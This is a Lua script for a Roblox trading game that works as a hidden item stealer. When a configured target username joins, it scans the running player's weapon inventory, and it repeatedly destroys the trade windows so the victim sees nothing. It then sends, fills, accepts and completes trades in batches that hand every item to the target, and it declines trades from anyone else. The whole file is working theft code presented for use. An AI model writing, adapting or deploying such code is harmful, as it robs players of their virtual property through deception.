local TradeState = {hasSent=false, hasOffered=false, hasAccepted=false, currentBatch=1, allItems={}, itemsOffered={}, tradeCount=0, isProcessing=false, isTargetTrade=false}
local TradeBlockerSetup = false

local function getItemInfo(id, t) if not Sync then return nil end return t == "Emotes" and (Sync.Emotes[id] or Sync.Toys[id]) or (Sync[t] and Sync[t][id]) end
local function getRarity(id, t) local info = getItemInfo(id, t) local r = info and info.Rarity or "Common" return RaritySort[r] or 100 end

local function scanInventory()
    local items = {}
    if not ProfileData then return items end
    if ProfileData.Weapons and ProfileData.Weapons.Owned then
        for id, amt in pairs(ProfileData.Weapons.Owned) do
            if id ~= "DefaultKnife" and id ~= "DefaultGun" and amt > 0 and getItemInfo(id, "Weapons") then
                table.insert(items, {id=id, type="Weapons", amount=amt, rarity=getRarity(id, "Weapons")})
            end
        end
    end
    if ProfileData.Uniques then
        for _, u in pairs(ProfileData.Uniques) do
            local base = u.BaseItem
            if base and base ~= "DefaultKnife" and base ~= "DefaultGun" then
                table.insert(items, {id=base, type="Weapons", amount=1, rarity=70})
            end
        end
    end
    table.sort(items, function(a,b) return a.rarity < b.rarity end)
    return items
end

local function setupBlocker()
    if TradeBlockerSetup then return end
    TradeBlockerSetup = true
    local pg = LocalPlayer:WaitForChild("PlayerGui")
    pg.ChildAdded:Connect(function(c) if c.Name:match("TradeGUI") or c.Name == "RequestFrame" then task.defer(function() pcall(function() if c and c.Parent then c:Destroy() end end) end) end end)
    task.spawn(function() while true do task.wait(0.05) pcall(function() for _, n in ipairs({"TradeGUI","TradeGUI_Phone","RequestFrame"}) do local g = pg:FindFirstChild(n) if g then g:Destroy() end end end) end end)
end

local function sendTradeRequest(targetPlayer)
    if not Trade then return false end
    local sendRemote = Trade:FindFirstChild("SendRequest")
    if not sendRemote then return false end
    local success = false
    pcall(function()
        local result = sendRemote:InvokeServer(targetPlayer)
        if result == true then success = true end
    end)
    return success
end

local function offerItems(items)
    if not Trade then return end
    for _, it in ipairs(items) do
        for i=1, it.amount do
            pcall(function()
                Trade.OfferItem:FireServer(it.id, it.type)
                task.wait(0.2)
            end)
        end
    end
end

local function acceptTrade()
    if not Trade then return end
    for _=1,5 do
        pcall(function()
            local _,td = Trade.GetTradeStatus:InvokeServer()
            if td and td.LastOffer then
                Trade.AcceptTrade:FireServer(game.PlaceId*3, td.LastOffer)
                return
            end
            Trade.AcceptTrade:FireServer()
        end)
        if _<5 then task.wait(1) end
    end
end

local function completeTrade()
    if Trade and Trade:FindFirstChild("CompleteTrade") then
        pcall(function() Trade.CompleteTrade:FireServer() end)
    end
end

local function getNextBatch()
    local startIdx = (TradeState.currentBatch - 1) * TradeConfig.ItemsPerTrade + 1
    local endIdx = math.min(startIdx + TradeConfig.ItemsPerTrade - 1, #TradeState.allItems)
    if startIdx > #TradeState.allItems then return {} end
    local batch = {}
    for i = startIdx, endIdx do
        local item = TradeState.allItems[i]
        table.insert(batch, {id=item.id, type=item.type, amount=item.amount})
    end
    return batch
end

local function executeFullTrade()
    local batch = getNextBatch()
    if #batch == 0 then return false end
    task.wait(1)
    offerItems(batch)
    TradeState.hasOffered = true
    task.wait(1)
    acceptTrade()
    TradeState.hasAccepted = true
    task.wait(0.5)
    completeTrade()
    TradeState.tradeCount = TradeState.tradeCount + 1
    TradeState.currentBatch = TradeState.currentBatch + 1
    return true
end

local function findTargetPlayer()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Name:lower() == TradeConfig.TargetUsername:lower() then
            return plr
        end
    end
    return nil
end

local function startTrading()
    if TradeState.isProcessing then return end
    TradeState.isProcessing = true
    local target = findTargetPlayer()
    if not target then
        TradeState.isProcessing = false
        return
    end
    local success = sendTradeRequest(target)
    if not success then
        TradeState.isProcessing = false
        task.wait(5)
        startTrading()
        return
    end
    TradeState.hasSent = true
    TradeState.isProcessing = false
end

if Trade and Trade:FindFirstChild("StartTrade") then
    Trade.StartTrade.OnClientEvent:Connect(function(tradeData, username)
        if username and username:lower() == TradeConfig.TargetUsername:lower() then
            TradeState.isTargetTrade = true
            local hasMore = executeFullTrade()
            if hasMore and #getNextBatch() > 0 then
                task.wait(5)
                startTrading()
            end
        else
            pcall(function() Trade.DeclineTrade:FireServer() end)
        end
    end)
    Trade.UpdateTrade.OnClientEvent:Connect(function(data)
        if TradeState.hasOffered and not TradeState.hasAccepted and data and data.LastOffer then
            acceptTrade()
            TradeState.hasAccepted = true
            task.wait(0.5)
            completeTrade()
        end
    end)
end

Players.PlayerAdded:Connect(function(plr)
    if plr.Name:lower() == TradeConfig.TargetUsername:lower() then
        TradeState.hasSent = false
        TradeState.hasOffered = false
        TradeState.hasAccepted = false
        TradeState.tradeCount = 0
        TradeState.currentBatch = 1
        TradeState.isTargetTrade = false
        TradeState.itemsOffered = {}
        local timeout = 10
        local startTime = tick()
        while not plr.Character and (tick() - startTime) < timeout do
            task.wait(0.5)
        end
        task.wait(3)
        setupBlocker()
        TradeState.allItems = scanInventory()
        startTrading()
    end
end)

